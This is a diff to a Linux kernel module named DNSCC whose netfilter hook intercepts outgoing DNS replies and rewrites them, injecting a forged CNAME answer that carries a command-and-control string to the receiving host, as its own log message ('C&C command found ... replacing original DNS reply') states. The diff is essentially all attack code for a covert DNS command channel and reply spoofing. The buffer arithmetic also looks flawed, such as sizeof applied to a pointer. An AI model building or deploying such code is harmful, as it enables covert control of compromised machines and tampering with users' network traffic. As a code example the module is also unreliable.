@@ -296,32 +296,41 @@ void manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned 
 
 
 	}
+	unsigned long writer = 0;
 	/* Create fake answer rr record */
-	unsigned char orig_ans[5] = "asd55";
+	unsigned char orig_ans[8] = "0hu2aaa3";
 	struct RR fake_rr;
 	int com_len = strlen(command)+1;
 	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
-	fake_rr.name[0] = htons(0x0c);
-	fake_rr.name[1] = htons(0xc0);
+	fake_rr.name[0] = 0xc0;
+	fake_rr.name[1] = 0x0c;
 	//memcpy(fake_rr.name,&command,sizeof(unsigned char)*2);
 	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
 	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
 	fake_rr.rr_data->type = htons(5);//cname
 	fake_rr.rr_data->class = htons(1);
-	fake_rr.rr_data->ttl = htons(0);
-	fake_rr.rr_data->rdlength = htons(5);
-	fake_rr.rdata = kmalloc(sizeof(unsigned char)*sizeof(orig_ans),GFP_DMA);
-	fake_rr.rdata = orig_ans;
+	fake_rr.rr_data->ttl = htons(1);
+	fake_rr.rr_data->rdlength = htons(com_len);
+	fake_rr.rdata = command;
 	/* put together the new dns packet */
-	unsigned int new_ar_size = sizeof(unsigned char)*sizeof(command)+sizeof(struct RR_DATA)+sizeof(unsigned char)*sizeof(orig_ans);
+	/* header */
 	ndns_h = (struct DNS_HEADER *)new_dns_data;
-	*ndns_h = *dns_h;								// use the old header
+	*ndns_h = *dns_h;			// use the old header
+	writer += sizeof(struct DNS_HEADER);
 	ndns_h->ancount = htons(1);
-	nqname = (unsigned char *)&new_dns_data[sizeof(struct DNS_HEADER)];
+	/* qname */
+	nqname = (unsigned char *)&new_dns_data[writer];
 	memcpy(nqname,qname,strlen((const char*)qname)+1+sizeof(struct QUESTION));	//use the original qname + question flags
-	new_ar = (struct RR *)&new_dns_data[sizeof(struct DNS_HEADER)+strlen((const char*)qname)+1+sizeof(struct QUESTION)];
-	memcpy(new_ar,&fake_rr,new_ar_size);//first answer here, so inject our fake cname
-	
+	writer += strlen((const char*)qname)+1+sizeof(struct QUESTION);
+	/* answer */
+	new_ar = (unsigned char *)&new_dns_data[writer];
+	memcpy(new_ar,fake_rr.name,sizeof(unsigned char)*2);//first answer here, so inject our fake cname
+	printk(KERN_INFO"new ar %x %x",new_dns_data[writer],new_dns_data[writer+1]);
+	writer += sizeof(unsigned char)*2;
+	memcpy(&new_dns_data[writer],fake_rr.rr_data,sizeof(struct RR_DATA));
+	writer += sizeof(struct RR_DATA)-2;
+	memcpy(&new_dns_data[writer],command,strlen((const char*)command)+1);
+	writer += sizeof(unsigned char)*sizeof(command)+1;
 }
 
 
@@ -421,7 +430,9 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	//	if(check_command_exists(iph->daddr) == 1){
 			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			/* Manipulate the answer */
-			unsigned char *command="3get5valam0";
+			unsigned char *command = "\3get\4elte\3com\0";
+//	command[0] = (uint16_t)3;
+//	command[4] = (uint16_t)0;
 			unsigned char *orig_dns_data;
 			unsigned char *new_dns_data;
 			uint16_t new_dns_size;
